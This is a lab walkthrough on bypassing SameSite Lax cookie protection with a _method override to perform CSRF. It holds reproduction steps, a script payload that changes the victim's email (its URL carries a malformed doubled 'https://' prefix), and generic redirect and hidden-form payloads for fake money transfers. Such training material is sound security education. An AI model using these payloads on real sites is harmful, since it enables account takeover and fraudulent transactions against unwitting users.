


                                           Lab: SameSite Lax bypass via method override
        
    steps to reproduce :-

    1. Configure your browser with a proxy tool such as Burp Suite.
    2. Login to the application using credentials wiener:peter
    3. Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, 
       so may be vulnerable to CSRF if you can bypass the SameSite cookie restrictions. 
    4. Look at the response to your POST /login request. Notice that the website doesn't explicitly specify any SameSite 
       restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level. 
    5. Send the POST /my-account/change-email request to Burp Repeater
    6. In Burp Repeater, right-click on the request and select Change request method. Burp automatically generates an 
       equivalent GET request.
    7. Send the request. Observe that the endpoint only allows POST requests. 
    8. Try overriding the method by adding the _method parameter to the query string:
       GET /my-account/change-email?email=hacked@gmail.com&_method=POST HTTP/1.1
    9. Send the request. Observe that this seems to have been accepted by the server. 
   10. Craft a payload and send it to exploit server 

   payload :-
   <script>
     document.location = "https://https://0a5d00de03d5f3128113398e00870088.web-security-academy.net/my-account/
                          change-email?email=hacked@gmail.com&_method=POST"
    </script>
    
   11. In the browser, go to your account page and confirm that your email address has changed.












   NOTES :::---
    In practice, servers aren't always fussy about whether they receive a GET or POST request to a given endpoint,
     even those that are expecting a form submission. If they also use Lax restrictions for their session cookies, 
     either explicitly or due to the browser default, you may still be able to perform a CSRF attack by eliciting a
      GET request from the victim's browser.

As long as the request involves a top-level navigation, the browser will still include the victim's session cookie. 
The following is one of the simplest approaches to launching such an attack:
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>

Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. 
For example, Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes:
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>

Other frameworks support a variety of similar parameters. 



